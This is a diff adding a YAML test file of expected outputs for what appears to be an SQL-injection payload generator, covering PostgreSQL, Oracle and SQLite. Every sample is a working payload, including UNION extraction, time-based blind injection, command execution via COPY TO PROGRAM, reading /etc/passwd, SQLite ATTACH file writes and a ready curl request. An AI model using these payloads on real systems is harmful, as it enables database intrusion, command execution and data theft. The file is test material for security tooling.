@@ -1,0 +1,214 @@
+# PostgreSQL / Oracle / SQLite 方言黄金样本（§13.2）
+#
+# 这三个方言是纯粹的数据差异，没有逼出任何结构改动——本文件就是那个结论的证据。
+# 值得单独测的只有方言特有的形态：Oracle 的 FROM dual、标识符里的 $、
+# PostgreSQL 的 || 拼接、SQLite 的 sqlite_master 与字面量。
+
+ruleDB: v0.1.0
+
+samples:
+  # ---------- PostgreSQL ----------
+
+  - name: PG 联合查询默认槽位
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.basic
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3 --"
+
+  - name: PG 用 || 拼接当前库与用户
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.union.current
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT current_database()||':'||current_user,2,3 --"
+
+  - name: PG COPY TO PROGRAM（载荷是 SQL，效果是命令）
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.cmd.copy_program
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "'; COPY (SELECT '') TO PROGRAM 'id'--"
+      # 'id' 落在字面量里，但值不含引号，不该有提示
+      checks_count: 0
+
+  - name: PG 时间盲注
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.time.pgsleep
+      outputs: [raw]
+    expect:
+      payload: "'; SELECT pg_sleep(5)--"
+
+  # ---------- Oracle ----------
+
+  - name: Oracle 联合查询必须带 FROM dual
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.basic
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3 FROM dual --"
+
+  - name: Oracle 版本取自 v$version
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.detect.version
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT banner,2,3 FROM v$version --"
+
+  - name: Oracle 回显标记用 CHR(65)
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.marker
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT CHR(65),2,3 FROM dual --"
+
+  - name: Oracle 时间盲注用 dbms_pipe
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.time.dbms_pipe
+      vars: {cond: "1=1"}
+      outputs: [raw]
+    expect:
+      payload: "' AND 1=(CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END) --"
+
+  - name: Oracle 标识符里的 $ 在 URL 里编成 %24
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.detect.version
+      submit: query
+      host: db.test
+      path: /
+      param: id
+      method: GET
+      shell: bash
+      outputs: [curl]
+    expect:
+      outputs:
+        # curl 用单引号包裹，$ 不会被 shell 展开
+        curl: "curl 'http://db.test/?id=%27%20UNION%20SELECT%20banner%2C2%2C3%20FROM%20v%24version%20--'"
+
+  # ---------- SQLite ----------
+
+  - name: SQLite 元数据在 sqlite_master
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.tables
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='table' --"
+
+  - name: SQLite 字面量 'table' 在空格替换下沉住
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.tables
+      bypasses: [bypass.space.comment]
+      outputs: [raw]
+    expect:
+      payload: "'/**/UNION/**/SELECT/**/group_concat(name),2,3/**/FROM/**/sqlite_master/**/WHERE/**/type='table'/**/--"
+
+  - name: SQLite 时间盲注靠 randomblob 烧 CPU
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.time.randomblob
+      outputs: [raw]
+    expect:
+      payload: "' AND length(randomblob(100000000))>0 --"
+
+  - name: SQLite ATTACH 写文件
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.file.attach
+      vars: {filepath: "/var/www/x.db"}
+      outputs: [raw]
+    expect:
+      payload: "'; ATTACH DATABASE '/var/www/x.db' AS pwn--"
+
+  # ---------- 回显位数与回显位（各方言一致的能力）----------
+
+  - name: MSSQL 回显位在第 3 位（4 列）
+    state:
+      vuln: sqli
+      component: mssql
+      template: sqli.mssql.detect.version
+      slots: {close: "'", cols: "4", pos: "3", comment: "--"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,@@version,4 --"
+
+  - name: Oracle 回显位在第 2 位（FROM dual 仍在）
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.union.current
+      slots: {close: "'", cols: "3", pos: "2", comment: "--"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,user,3 FROM dual --"
+
+  - name: SQLite 回显位在第 3 位
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.tables
+      slots: {close: "'", cols: "4", pos: "3", comment: "--"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master WHERE type='table' --"
+
+  - name: 带包装的表达式也能按回显位放
+    state:
+      vuln: sqli
+      component: postgresql
+      template: sqli.postgresql.file.read
+      slots: {close: "'", cols: "3", pos: "2", comment: "--"}
+      vars: {filepath: "/etc/passwd"}
+      outputs: [raw]
+    expect:
+      # 第三个参数里带了括号和 <<filepath>>，括号配对扫描要能正确处理
+      payload: "' UNION SELECT 1,pg_read_file('/etc/passwd'),3 --"
+
+  # ---------- 变量落在字面量内的提示在各方言上一致 ----------
+
+  - name: 只有落在引号内的变量才提示，括号内的不提示
+    state:
+      vuln: sqli
+      component: oracle
+      template: sqli.oracle.oob.utl_http
+      # body 是 ...utl_http.request('http://<<lhost>>/'||(<<expr>>))：
+      # lhost 在 '...' 里，expr 只在括号里。两个值都含引号，但只该报 lhost 一个。
+      vars: {lhost: "a'b", expr: "it's"}
+      outputs: [raw]
+    expect:
+      checks_count: 1
+
+  - name: SQLite 同一模板变量不含引号 → 不提示
+    state:
+      vuln: sqli
+      component: sqlite
+      template: sqli.sqlite.union.schema
+      vars: {table: "users"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT sql,2,3 FROM sqlite_master WHERE name='users' --"
+      checks_count: 0
